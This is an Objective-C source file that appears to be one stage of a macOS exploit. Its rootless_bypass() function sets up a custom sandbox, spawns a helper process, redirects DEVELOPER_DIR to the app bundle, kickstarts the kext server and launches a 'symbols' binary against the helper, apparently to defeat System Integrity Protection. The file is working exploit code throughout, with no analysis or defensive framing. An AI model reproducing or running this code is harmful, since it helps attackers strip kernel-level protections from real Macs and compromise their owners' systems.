#import <Foundation/Foundation.h>

#include <assert.h>
#include <signal.h>
#include <spawn.h>
#include <sys/stat.h>

#include "exploit.h"
#include "log.h"

#define SANDBOX_NAMED_EXTERNAL 0x0003
int sandbox_init_with_parameters(const char *profile, uint64_t flags, const char *const parameters[], char **errorbuf);

extern char **environ;

#ifndef YES
#define YES 1
#endif

const char *relative(const char *component) {
  NSString *base = [[NSBundle mainBundle] bundlePath];
  if (!component)
    return [base UTF8String];
  NSString *tail = [NSString stringWithUTF8String:component];
  return [[base stringByAppendingPathComponent:tail] UTF8String];
}

int rootless_bypass() {
  const char *null_params[] = {NULL};
  int status;

  status = sandbox_init_with_parameters(relative("jail.sb"), SANDBOX_NAMED_EXTERNAL, null_params, NULL);
  assert(status == 0);

  pid_t pid_swift = 0;
  const char *taytay = relative("taytay");
  status = posix_spawn(&pid_swift, taytay, NULL, NULL, (char *const *)null_params, environ);
  assert(status == 0);

  char pid_str[16];
  snprintf(pid_str, sizeof pid_str, "%d", pid_swift);
  LOG("taytay pid: %d\n", pid_swift);

  const char *target_binary = relative("symbols");
  struct stat st;
  if (stat(target_binary, &st)) {
    LOG(@"fatal error, binary not found: %s", target_binary);
    exit(255);
  }

  char *target_argv[] = {(char *)target_binary, pid_str, "-printDemangling", NULL};
  setenv("DEVELOPER_DIR", relative(NULL), YES);

  // kickstart kextd
  kickstart("com.apple.KernelExtensionServer");
  // kickstart("com.apple.security.syspolicy.kext");

  // do it
  pid_t pid_sym = 0;
  posix_spawn_file_actions_t action;
  posix_spawn_file_actions_init(&action);
  posix_spawn_file_actions_addopen(&action, STDOUT_FILENO, "/dev/null", O_RDONLY, 0);

  status = posix_spawn(&pid_sym, target_binary, &action, NULL, (char *const *)target_argv, environ);
  LOG("status: %d, pid %d", status, pid_sym);
  assert(status == 0);
  waitpid(pid_sym, &status, 0);
  kill(pid_swift, SIGKILL);

  return 0;
}
